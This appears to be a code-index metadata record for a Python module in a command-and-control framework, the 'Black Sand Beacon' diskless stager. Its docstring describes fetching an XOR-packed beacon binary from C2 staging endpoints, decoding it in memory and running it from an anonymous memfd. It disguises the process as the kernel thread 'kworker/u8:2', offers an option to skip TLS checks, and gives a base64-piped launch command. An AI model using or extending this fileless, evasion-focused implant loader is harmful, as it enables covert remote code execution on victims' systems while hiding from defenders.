{"uid":"c2/stage_payload.py","name":"stage_payload.py","qualname":"c2/stage_payload.py","kind":"module","file":"c2/stage_payload.py","line":1,"end_line":97,"language":"py","signature":"","params":[],"returns":"","decorators":[],"bases":[],"modifiers":[],"visibility":"public","doc":{"summary":"Black Sand Beacon diskless stager.","description":"Fetches the token-packed beacon ELF and config.json from the C2 staging\nendpoints, decodes them in RAM, and executes the beacon from an\nanonymous memfd. Nothing is ever written to disk.\n\nPacking is three XOR layers whose keys are derived from the staging\ntoken via HKDF-SHA256 (salt \"blacksandbeacon-stage-v1\") — byte-identical\nto the server's derivation in c2/server.py. No key material on the wire.\n\nEnvironment:\n    BSB_STAGE_URL          base C2 URL (e.g. https://c2.example:7070)\n    BSB_STAGE_TOKEN        staging token (same as server.stage_token)\n    BSB_STAGE_ARGV0        argv[0] for the beacon (default \"kworker/u8:2\")\n    BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)\n\nUsage:\n    python3 stage_payload.py\n    echo <b64> | base64 -d | BSB_STAGE_URL=... BSB_STAGE_TOKEN=... python3 -","params":[],"returns":null,"yields":null,"raises":[],"attributes":[],"examples":[],"notes":[],"see_also":[],"deprecated":"","since":"","style":"plain"},"parent":"","members":["c2/stage_payload.py::HKDF_SALT","c2/stage_payload.py::HKDF_INFOS","c2/stage_payload.py::hkdf_sha256","c2/stage_payload.py::main"],"inferred_raises":[],"returns_value":null,"value":"","base_uids":[],"subclasses":[],"calls":[],"called_by":[]}
